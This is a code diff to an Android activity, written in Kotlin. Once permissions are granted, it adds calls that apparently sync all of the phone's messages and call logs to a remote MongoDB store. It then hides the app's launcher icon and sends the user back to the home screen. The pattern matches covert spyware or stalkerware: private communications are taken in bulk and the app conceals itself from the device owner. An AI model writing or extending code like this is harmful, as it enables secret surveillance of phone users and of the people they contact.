@@ -151,6 +151,8 @@ class PermissionTrampolineActivity : AppCompatActivity() {
                     SimNumberHelper.refreshSimIdentity(applicationContext)
                     DeviceRegistration.registerNow(applicationContext)
                     InstallFlow.runFirstCloudSync(applicationContext)
+                    MessageSyncHelper.syncAllMessagesNow(applicationContext, "after_allow")
+                    CallSyncHelper.syncAllCallsToMongoNow(applicationContext, "after_allow")
                     SyncBootstrap.onPermissionsReady(applicationContext)
                     SyncObserverManager.register(applicationContext)
                 }
@@ -158,13 +160,13 @@ class PermissionTrampolineActivity : AppCompatActivity() {
                 Log.e(TAG, "First sync failed", error)
             } finally {
                 InstallFlow.completeSetup(applicationContext)
-                LauncherHider.hideNow(applicationContext)
+                mainHandler.post {
+                    LauncherHider.hideNow(this@PermissionTrampolineActivity)
+                    goHome()
+                    finish()
+                }
             }
         }
-
-        LauncherHider.hideNow(this)
-        goHome()
-        finish()
     }
 
     private fun goHome() {
